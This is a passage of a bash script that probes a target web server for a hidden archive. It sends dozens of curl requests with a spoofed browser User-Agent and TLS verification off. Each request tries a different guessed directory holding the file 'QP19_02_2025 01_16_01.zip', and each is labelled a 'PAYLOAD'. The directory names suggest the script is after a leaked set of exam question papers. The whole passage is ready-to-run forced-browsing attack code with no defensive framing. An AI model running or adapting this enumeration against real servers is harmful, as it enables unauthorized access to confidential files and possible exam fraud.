" "${target}Sync-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
